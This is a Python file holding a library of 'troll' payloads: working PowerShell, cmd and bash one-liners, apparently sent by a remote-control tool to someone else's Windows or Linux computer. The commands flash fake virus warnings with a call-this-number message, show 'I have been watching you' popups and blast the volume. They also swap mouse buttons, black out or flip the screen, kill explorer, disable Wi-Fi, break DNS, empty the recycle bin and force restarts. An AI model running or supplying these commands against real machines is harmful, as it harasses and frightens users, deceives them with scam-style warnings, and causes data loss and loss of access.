# lang: Python 3, file: troll_payloads.py, target: Windows / Linux
# built-in one-shot troll command library

_DEVMODE_TYPE = (
    "$code=@'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public struct DEVMODE{"
    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;"
    "public short dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;public int dmFields;"
    "public int dmPositionX,dmPositionY,dmDisplayOrientation;public int dmDisplayFixedOutput;"
    "public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;"
    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;"
    "public short dmLogPixels;"
    "public int dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;}\n"
    "public class Disp{"
    "[DllImport(\"user32.dll\")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);"
    "[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE dm,int f);}\n"
    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
    "$dm=New-Object DEVMODE;"
    "$dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);"
    "[Disp]::EnumDisplaySettings($null,-1,[ref]$dm);"
)
_COLMAT_TYPE = (
    "$code=@'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public struct ColorMatrix{public float m00,m01,m02,m03,m04,m10,m11,m12,m13,m14,"
    "m20,m21,m22,m23,m24,m30,m31,m32,m33,m34,m40,m41,m42,m43,m44;}\n"
    "public class Mag{"
    "[DllImport(\"magnification.dll\")]public static extern bool MagInitialize();"
    "[DllImport(\"magnification.dll\")]"
    "public static extern bool MagSetFullscreenColorEffect(ref ColorMatrix m);}\n"
    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
    "[Mag]::MagInitialize()|Out-Null;$m=New-Object ColorMatrix;"
)

# full TROLL_PAYLOADS dict — identical to original, kept intact
TROLL_PAYLOADS = {
    "🔊  Audio": [
        ("beep",              "powershell", "[console]::beep(1000,500)"),
        ("exclamation wav",   "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Exclamation.wav').PlaySync()"),
        ("critical stop x10","powershell",
         "1..10|%{(New-Object Media.SoundPlayer"
         " 'C:\\Windows\\Media\\Windows Critical Stop.wav').PlaySync();Start-Sleep 2}"),
        ("ding",              "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Ding.wav').PlaySync()"),
        ("logon sound",       "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Logon.wav').PlaySync()"),
        ("random wav loop",   "powershell",
         "while($true){$w=(Get-ChildItem 'C:\\Windows\\Media\\*.wav'|Get-Random).FullName;"
         "(New-Object Media.SoundPlayer $w).PlaySync();Start-Sleep 5}"),
        ("siren loop",        "powershell",
         "while($true){[console]::beep(1200,200);[console]::beep(600,200)}"),
        ("speak hello",       "powershell",
         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello there')"),
        ("speak creepy",      "powershell",
         "$v=New-Object -ComObject SAPI.SpVoice;$v.Rate=-5;$v.Speak('I see you')"),
        ("speak username",    "powershell",
         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello '+$env:USERNAME)"),
        ("mute toggle",       "powershell",
         "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"),
        ("max volume",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
         "1..50|%{[W.V]::keybd_event(0xAF,0,0,0);[W.V]::keybd_event(0xAF,0,2,0);"
         "Start-Sleep -Milliseconds 30}"),
        ("popup watch msg",   "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "1..10|%{[System.Windows.Forms.MessageBox]::Show("
         "'Hello. I have been watching you.','...',"
         "[System.Windows.Forms.MessageBoxButtons]::OK,"
         "[System.Windows.Forms.MessageBoxIcon]::Warning)|Out-Null}"),
        ("jumpscare",            "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
         "1..50|%{[W.V]::keybd_event(0xAF,0,0,0);[W.V]::keybd_event(0xAF,0,2,0);"
         "Start-Sleep -Milliseconds 20};"
         "Start-Process 'https://youtu.be/UZw7y0-txpI'"),
    ],
    "🖼  Wallpaper": [
        ("random wallpaper",  "powershell",
         "$img=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
         "public class WP{[DllImport(\"user32.dll\")]"
         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
         " -EA SilentlyContinue;[WP]::SystemParametersInfo(20,0,$img,3)"),
        ("rotate wallpaper",  "powershell",
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
         "public class WPR{[DllImport(\"user32.dll\")]"
         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
         " -EA SilentlyContinue;"
         "while($true){$i=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
         "[WPR]::SystemParametersInfo(20,0,$i,3);Start-Sleep 10}"),
        ("giant icons",       "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop'"
         " -Name IconSize -Value 256"),
    ],
    "🖱  Cursor": [
        ("swap mouse",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
         "[W.M]::SwapMouseButton($true)|Out-Null"),
        ("unswap mouse",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
         "[W.M]::SwapMouseButton($false)|Out-Null"),
        ("move cursor",       "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);';"
         "Add-Type -MemberDefinition $sig -Name C -Namespace W -ErrorAction SilentlyContinue;"
         "1..100|%{[W.C]::SetCursorPos((Get-Random -Max 1920),(Get-Random -Max 1080));"
         "Start-Sleep -Milliseconds 100}"),
        ("max speed",         "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '20'"),
        ("min speed",         "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '1'"),
    ],
    "💬  Popups": [
        ("spam notepad",      "powershell",
         "1..20|%{Start-Process notepad.exe;Start-Sleep -Milliseconds 200}"),
        ("10 calculators",    "powershell",
         "1..10|%{Start-Process calc;Start-Sleep -Milliseconds 300}"),
        ("open task manager", "powershell", "Start-Process taskmgr"),
        ("open URLs",         "powershell",
         "'https://www.youtube.com/watch?v=dQw4w9WgXcQ',"
         "'https://neal.fun/infinite-craft/',"
         "'https://www.bing.com/search?q=am+i+hacked'|%{Start-Process $_}"),
        ("msgbox(1-800)",     "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "[System.Windows.Forms.MessageBox]::Show("
         "'Your computer has a virus. Please call 1-800-HACKED immediately.','WARNING',"
         "[System.Windows.Forms.MessageBoxButtons]::OK,"
         "[System.Windows.Forms.MessageBoxIcon]::Error)"),
        ("fake restart msg",  "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "[System.Windows.MessageBox]::Show("
         "'The system has detected a problem and must restart.','Error',0)"),
    ],
    "⌨  Keyboard": [
        ("wall of text",      "powershell",
         "$w=(New-Object -ComObject WScript.Shell);"
         "1..200|%{$w.SendKeys('ALL YOUR BASE ARE BELONG TO US ')}"),
        ("caps lock spam",    "powershell",
         "$w=(New-Object -ComObject WScript.Shell);"
         "1..20|%{$w.SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 300}"),
        ("lock workstation",  "cmd", "rundll32 user32.dll,LockWorkStation"),
    ],
    "🖥  Screen": [
        ("flip screen",       "powershell",
         _DEVMODE_TYPE + "$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
        ("unflip screen",     "powershell",
         _DEVMODE_TYPE + "$dm.dmFields=0x80;$dm.dmDisplayOrientation=0;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
        ("invert colors",     "powershell",
         _COLMAT_TYPE + "$m.m00=-1;$m.m11=-1;$m.m22=-1;$m.m33=1;$m.m44=1;"
         "$m.m04=1;$m.m14=1;$m.m24=1;[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
        ("uninvert colors",   "powershell",
         _COLMAT_TYPE + "$m.m00=1;$m.m11=1;$m.m22=1;$m.m33=1;$m.m44=1;"
         "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
        ("brightness 0",      "powershell",
         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
         ".WmiSetBrightness(1,0)"),
        ("brightness 100",    "powershell",
         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
         ".WmiSetBrightness(1,100)"),
        ("screen off",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]"
         "public static extern int SendMessage(int h,int m,int w,int l);';"
         "Add-Type -MemberDefinition $sig -Name SM -Namespace W -EA SilentlyContinue;"
         "[W.SM]::SendMessage(0xFFFF,0x0112,0xF170,2)"),
    ],
    "📋  Taskbar": [
        ("taskbar hide",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,0)"),
        ("taskbar show",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,5)"),
        ("kill explorer",     "powershell", "Stop-Process -Name explorer -Force"),
        ("start explorer",    "powershell", "Start-Process explorer.exe"),
    ],
    "📁  Files / Desktop": [
        ("50 desktop files",  "powershell",
         "1..50|%{New-Item \"$env:USERPROFILE\\Desktop\\file$_.txt\" -Force|Out-Null}"),
        ("rickroll shortcut", "powershell",
         "$s=(New-Object -ComObject WScript.Shell).CreateShortcut("
         "\"$env:USERPROFILE\\Desktop\\YouTube.lnk\");"
         "$s.TargetPath='https://www.youtube.com/watch?v=dQw4w9WgXcQ';$s.Save()"),
        ("empty recycle bin", "powershell", "Clear-RecycleBin -Force"),
    ],
    "📋  Clipboard": [
        ("set 'troll'",       "powershell", "Set-Clipboard 'troll'"),
        ("set rickroll url",  "powershell",
         "Set-Clipboard 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"),
        ("clear loop",        "powershell",
         "while($true){Set-Clipboard '';Start-Sleep 2}"),
    ],
    "🌐  Network": [
        ("disable Wi-Fi",     "powershell",
         "Disable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
        ("enable Wi-Fi",      "powershell",
         "Enable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
        ("flush DNS",         "cmd", "ipconfig /flushdns"),
        ("set bad DNS",       "powershell",
         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
         " -ServerAddresses '192.0.2.1' -EA SilentlyContinue"),
        ("restore DNS",       "powershell",
         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
         " -ServerAddresses '8.8.8.8' -EA SilentlyContinue"),
    ],
    "⚙  System": [
        ("lock workstation",  "cmd",   "rundll32 user32.dll,LockWorkStation"),
        ("sleep",             "powershell", "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"),
        ("restart",           "cmd",   "shutdown /r /t 0"),
    ],
    "🐧  Linux": [
        ("[L] wall msg",      "bash",
         "wall 'Your system has been compromised.' 2>/dev/null"),
        ("[L] spam beep",     "bash",
         "for i in $(seq 1 20); do echo -ne '\\a'; sleep 0.2; done"),
        ("[L] fake rm -rf",   "bash",
         "echo 'rm: it is dangerous to operate recursively on \"/\"'; "
         "echo 'rm: use --no-preserve-root to override this failsafe'; sleep 2; "
         "echo '[sudo] removing system files...'; sleep 1; echo 'just kidding lol'"),
        ("[L] yes spam",      "bash",
         "timeout 5 yes 'ALL YOUR BASE ARE BELONG TO US' &"),
    ],
}
